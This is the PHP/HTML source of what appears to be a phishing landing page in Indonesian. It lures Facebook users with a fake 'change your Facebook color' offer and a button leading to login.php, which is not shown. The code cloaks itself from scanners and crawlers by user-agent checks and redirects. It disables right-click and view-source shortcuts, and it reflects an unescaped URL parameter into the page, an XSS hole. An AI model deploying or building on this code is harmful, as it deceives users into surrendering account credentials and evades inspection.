<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('https://www.facebook.com/IdhamDotID');
die();
}
?>
<?php
	error_reporting(0);
	$link = $_GET['u'];
	$imganu = array('DDL001','DDL002','DDL003','DDL004','DDL005');
	$download = $imganu[rand(0, (count($imganu)-1))];
?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<noscript><meta http-equiv="refresh" content="0; URL=https://www.facebook.com/IdhamDotID"/></noscript>
		<meta name="description" content="<?php echo $link;?> - Klik Disini Untuk Ganti Warna"/>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /> 
        <meta name="viewport" content="width=360.1, user-scalable=no, initial-scale=1.0, maximum-scale=1.0">
        <meta name="mobile-web-app-capable" content="yes"/>
        <meta name="apple-mobile-web-app-capable" content="yes"/>
        <meta name="apple-mobile-web-app-status-bar-style" content="black"/>
        <meta name="msapplication-tap-highlight" content="no"/>
        <meta name="format-detection" content="telephone=no">
   		<meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta content='width=device-width, initial-scale=1, maximum-scale=1' name='viewport'/>
        <meta property="og:title" content="<?php echo $link;?> - Klik Disini Ganti Warna!" />
        <meta property="og:image" content="./img/<?php echo ''.$download.'';?>.jpg" />
		<link rel="shortcut icon" href="./img/favicon.png"/>
		<title><?php echo $link;?> - Ganti Warna!</title>
   		<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;">
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    	<link rel="stylesheet" media="all" href="./css/style.css"/>
	</head>
    <body>
        <div class="header">
            <div class="content">
                Selamat Datang <i><?php echo $link;?></i><p/>
                <span>Ganti Warna Facebook Berdasarkan Namamu Sekarang!</span>
            </div>
        </div>
        <div class="namamu">
            <img class="download" src="./img/<?php echo ''.$download.'';?>.jpg" alt="idhaam69"/><br/>
            <button class="btn-download" id="1" onclick="location.href='login.php';">Ganti Warna!</button>
        </div>
        <script>
            var txt="<?php echo $link;?> - Ganti Warna!";
            var kecepatan=0;var segarkan=null;function berhenti() { document.title=txt;
                txt=txt.substring(1,txt.length)+txt.charAt(0);
                segarkan=setTimeout("behenti()",kecepatan);}berhenti();
            document.addEventListener("contextmenu", function(e){ e.preventDefault(); }, false);
            document.onkeydown = function(e) {
                if (e.ctrlKey && 
                    (e.keyCode === 67 || 
                    e.keyCode === 83 || 
                    e.keyCode === 85 || 
                    e.keyCode === 117)) {
                    window.location.replace("index.html");
                return false;
                } else {
                     return true;
                }
            };
        </script>
        <!--Kode untuk mencegah shorcut keyboard, view source dll.-->
        <script type="text/javascript">
            window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
        </script>
        <script type="text/javascript">
            document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}
        </script>
    </body>
</html>
